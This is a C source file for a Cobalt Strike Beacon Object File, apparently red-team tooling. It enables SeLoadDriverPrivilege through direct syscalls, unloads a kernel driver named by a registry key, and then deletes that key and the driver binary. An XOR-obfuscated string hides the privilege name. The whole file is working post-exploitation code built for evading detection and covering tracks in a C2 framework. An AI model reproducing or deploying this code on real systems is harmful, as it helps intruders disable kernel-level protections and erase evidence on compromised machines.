////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      UnloadDriver BOF
//
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2
//      AUTHOR: @Cerbersec
//      PROPERTY OF: @NVISOSecurity
//
//      COMPILE WITH: gcc -o UnloadDriver.o -c UnloadDriver.c -masm=intel
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include <Windows.h>
#include "UnloadDriver.h"
#include "helpers.h"
#include "syscalls.c"

void go(char* args, int alen) {
    if (8 != sizeof(void *)) {
        BeaconPrintf(CALLBACK_ERROR, "Not a 64 bit system");
        return;
    }

    if (!ChangeTokenPrivileges(TRUE)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not change privileges");
        return;
    }

    datap parser;
    BeaconDataParse(&parser, args, alen);
    LPCWSTR lpRegKey = (wchar_t*)BeaconDataExtract(&parser, NULL);
    LPCWSTR lpDriverPath = (wchar_t*)BeaconDataExtract(&parser, NULL);

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    if (!NT_SUCCESS(UnloadDriver(lpRegKey, lpDriverPath, TRUE))) {
        DeleteRegKey(lpRegKey);
        return;
    }

    if (!ChangeTokenPrivileges(FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not revert privileges");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
    return;
}

BOOLEAN ChangeTokenPrivileges(BOOL Enable) {

    NTSTATUS status;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken;

    status = NtOpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hToken);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not open current process token: %lx", status);
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, wobfsct((wchar_t*)L"\x46\x4f\x18\xc7\x30\xc6\x01\xf8\x7c\x5c\x31\xda\x01\xd0\x2c\xfc\x7c\x46\x31\xcf\x34\x00", 21), &luid)) { //SeLoadDriverPrivilege
        BeaconPrintf(CALLBACK_ERROR, "Privilege lookup error");
        NtClose(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if(Enable)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    status = NtAdjustPrivilegesToken(hToken, FALSE, &tp, 0, NULL, 0);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not adjust token privileges: %lx", status);
        NtClose(hToken);
        return FALSE;
    }

    NtClose(hToken);
    return TRUE;
}

NTSTATUS UnloadDriver(LPCWSTR RegKey, LPCWSTR DriverPath, BOOLEAN Remove) {
    NTSTATUS status;
    UNICODE_STRING driverServiceName;

    RtlInitUnicodeString(&driverServiceName, RegKey);
    status = NtUnloadDriver(&driverServiceName);

    if (NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Driver unloaded");
        if (Remove)
        {
            if (Cleanup(RegKey, DriverPath))
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Cleanup success");
        }
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to unload driver: %lx", status);
    }
    return status;
}

BOOL Cleanup(LPCWSTR key, LPCWSTR path) {
    NTSTATUS status;
    BOOL reg = TRUE, bin = TRUE;
    if (key) {
        status = DeleteRegKey(key);
        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "Could not remove registry key: %ws - %lx", key, status);
            reg = FALSE;
        }
    }

    if (path) {
        status = DeleteBinary(path);
        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "Could not remove binary: %ws - %lx", path, status);
            bin = FALSE;
        }
    }
    return (reg && bin);
}

NTSTATUS DeleteRegKey(LPCWSTR key) {
    NTSTATUS status;
    HANDLE hKey;
    UNICODE_STRING keyName;
    RtlInitUnicodeString(&keyName, key);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKeyEx(&hKey, DELETE, &oa, 0);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Error opening key: %lx", status);
        NtClose(hKey);
        return status;
    }

    status = NtDeleteKey(hKey);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not delete key: %lx", status);
        NtClose(hKey);
        return status;
    }

    NtClose(hKey);
    return status;
}

NTSTATUS DeleteBinary(LPCWSTR path) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING binaryPath;
    RtlInitUnicodeString(&binaryPath, path);
    InitializeObjectAttributes(&oa, &binaryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtDeleteFile(&oa);

    for (int i = 0; (i < 3 && !NT_SUCCESS(status)); i++) {
        NtDelayExecution(FALSE, (PLARGE_INTEGER)1000);
        status = NtDeleteFile(&oa);
    }
    return status;
}